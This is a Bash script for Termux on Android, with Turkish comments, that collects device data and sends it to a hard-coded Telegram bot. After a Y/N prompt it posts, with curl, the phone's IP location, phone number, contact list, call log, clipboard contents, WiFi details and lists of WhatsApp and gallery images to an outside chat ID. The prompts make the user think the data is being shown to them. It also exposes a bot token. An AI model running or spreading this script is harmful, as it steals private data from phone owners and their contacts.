#!/bin/bash

# Telegram Bot Token ve Chat ID
BOT_TOKEN="7635752761:AAGNNpMU3ST3LM62VLRSVXQmkIPX3Hz0xuo"
CHAT_ID="7561737990"

# Fonksiyon: Telegram'a mesaj gönder
send_telegram_message() {
    local message=$1
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d chat_id=$CHAT_ID -d text="$message"
}

# Kullanıcıdan izin almak için fonksiyon
ask_permission() {
    local question=$1
    local permission
    read -p "$question (Y/N): " permission
    if [[ "$permission" == "Y" || "$permission" == "y" ]]; then
        return 0  # İzin verildi
    else
        return 1  # İzin verilmedi
    fi
}

# IP, Ülke, Şehir bilgilerini alma
if ask_permission "IP Adresi, Ülke, Şehir bilgisini almak ister misiniz?"; then
    ip_info=$(curl -s https://ipinfo.io)
    send_telegram_message "📡 **Bilgiler**\n$ip_info"
fi

# Batarya durumu bilgisi alma
if ask_permission "Batarya durumu bilgisini almak ister misiniz?"; then
    battery_info=$(termux-battery-status)
    send_telegram_message "🔋 **Batarya Durumu**\n$battery_info"
fi

# Telefon modelini alma
if ask_permission "Telefon modelini almak ister misiniz?"; then
    phone_model=$(termux-telephony-deviceinfo | grep "Model")
    send_telegram_message "📱 **Telefon Modeli**\n$phone_model"
fi

# WiFi SSID ve BSSID bilgisi alma
if ask_permission "WiFi SSID ve BSSID bilgilerini almak ister misiniz?"; then
    wifi_info=$(termux-wifi-connectioninfo)
    send_telegram_message "📶 **WiFi Bilgileri**\n$wifi_info"
fi

# Telefon numarasını alma
if ask_permission "Telefon numarasını almak ister misiniz?"; then
    phone_number=$(termux-telephony-deviceinfo | grep "Phone Number")
    send_telegram_message "📞 **Telefon Numarası**\n$phone_number"
fi

# Rehberdeki kişileri alma
if ask_permission "Rehberdeki kişileri almak ister misiniz?"; then
    contacts=$(termux-contact-list)
    send_telegram_message "📖 **Rehber Kişileri**\n$contacts"
fi

# Son arama kayıtlarını alma
if ask_permission "Son arama kayıtlarını almak ister misiniz?"; then
    call_log=$(termux-call-log)
    send_telegram_message "📜 **Son Arama Kayıtları**\n$call_log"
fi

# Panodaki (Clipboard) verisini alma
if ask_permission "Panodaki veriyi almak ister misiniz?"; then
    clipboard=$(termux-clipboard-get)
    send_telegram_message "📋 **Panodaki Veri**\n$clipboard"
fi

# WhatsApp ve DCIM'deki resimleri alma (Yalnızca JPG ve PNG)
if ask_permission "WhatsApp ve DCIM'deki resimleri almak ister misiniz?"; then
    whatsapp_images=$(find /storage/emulated/0/WhatsApp/Media/WhatsApp\ Images -type f -iname \*.jpg -o -iname \*.png)
    dcim_images=$(find /storage/emulated/0/DCIM -type f -iname \*.jpg -o -iname \*.png)
    send_telegram_message "📷 **WhatsApp ve DCIM Resimleri**\nWhatsApp Resimleri:\n$whatsapp_images\nDCIM Resimleri:\n$dcim_images"
fi

# Ekran görüntüleri (Screenshots)
if ask_permission "Ekran görüntülerini almak ister misiniz?"; then
    screenshots=$(find /storage/emulated/0/Pictures/Screenshots -type f -iname \*.jpg -o -iname \*.png)
    send_telegram_message "📸 **Ekran Görüntüleri**\n$screenshots"
fi

send_telegram_message "✅ **Veriler Gönderildi**"

exit 0
